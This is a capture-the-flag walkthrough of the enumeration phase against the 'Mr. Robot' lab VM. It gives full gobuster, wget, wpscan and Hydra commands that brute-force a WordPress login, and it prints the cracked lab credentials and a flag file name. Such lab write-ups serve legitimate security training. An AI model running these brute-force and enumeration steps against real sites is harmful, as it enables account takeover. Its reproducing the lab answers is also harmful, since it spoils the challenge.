🕵️ Enumeration – Mr. Robot

Now that we know HTTP (port 80) is open, we'll begin enumeration of the web server and underlying application — primarily WordPress.

---

## 🌐 1. Access the Website

Visit:
```

[http://192.168.1.105](http://192.168.1.105)

````

### 🔍 Homepage
- Displays a Mr. Robot-themed landing page
- "Hello friend" message
- `robot.jpg`, `fsociety.dic` hints are hidden

---

## 🧾 2. Analyze Source Code

Inspect the HTML source of the homepage:
- May reveal comments
- Links to potential hidden files or directories

---

## 📂 3. Directory Bruteforce with Gobuster

```bash
gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -o gobuster.txt
````

✅ Results (sample):

```
/robots.txt
/license
/wp-admin/
/wp-content/
/wp-includes/
/readme
```

---

## 📑 4. robots.txt & Wordlists

Visit:

```
http://192.168.1.105/robots.txt
```

Reveals:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Download both:

```bash
wget http://192.168.1.105/fsocity.dic
wget http://192.168.1.105/key-1-of-3.txt
```

📌 `fsocity.dic` is a huge wordlist — contains duplicates, clean it:

```bash
sort fsocity.dic | uniq > wordlist.txt
```

---

## 🛠️ 5. WordPress Scan with WPScan

```bash
wpscan --url http://192.168.1.105 --enumerate u
```

✅ Finds:

* WordPress version: 4.3.1 (vulnerable)
* User: `elliot`

---

## 🔐 6. Password Brute Force with Hydra

Using the cleaned wordlist:

```bash
hydra -l elliot -P wordlist.txt 192.168.1.105 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" -V
```

✅ Eventually cracks:

```
elliot:ER28-0652
```

---

## 🧠 Summary

| Item Discovered | Value            |
| --------------- | ---------------- |
| WordPress Login | `/wp-login.php`  |
| Username        | `elliot`         |
| Password        | `ER28-0652`      |
| File Found      | `key-1-of-3.txt` |
| Wordlist Found  | `fsocity.dic`    |

---

📂 Proceed to [`exploitation.md`](./exploitation.md) to log in and exploit the WordPress site for a reverse shell.
